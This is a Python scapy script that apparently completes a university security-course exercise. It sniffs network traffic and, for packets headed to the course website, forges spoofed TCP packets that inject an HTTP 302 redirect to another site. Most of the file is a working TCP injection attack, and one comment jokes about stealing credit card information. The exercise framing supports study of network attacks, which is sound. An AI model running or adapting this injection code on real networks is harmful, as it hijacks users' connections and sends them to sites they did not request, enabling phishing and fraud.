import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: https://www.instagram.com',
    r'',
    r''])


WEBSITE = 'infosec.cs.tau.ac.il'


def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to instagram by sending them the
    `RESPONSE` from above.
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError()
    #first check we at course website, then creat tcp packet, then send injected
    
    #make the packet as string so we can check if WEBSITE is in the packet
    packet_str = str(packet)
    #pack_url = urlparse.urlparse(packet_str).path
    
    if WEBSITE not in packet_str:
        return False
    
    #we want to dress up like the legit site, so exchange the ip
    ip_pack = S.IP(src = packet[S.IP].dst, dst = packet[S.IP].src) 
    #we want to dress up like the legit site, also close the connection
    tcp_pack = S.TCP(sport = packet[S.TCP].dport,
                dport =packet[S.TCP].sport, flags = 'AF',
                seq = packet[S.TCP].ack ,
                ack = packet[S.TCP].seq+len(packet[S.TCP].payload))
    #the pakcet we the false web, let's steal some credit card info!!!
    false_web = S.Raw(load = RESPONSE)
    
    #unite the packets
    inject = ip_pack / tcp_pack / false_web 
    return inject


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args or len(args) > 1:
        print('Usage: %s' % args[0])
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
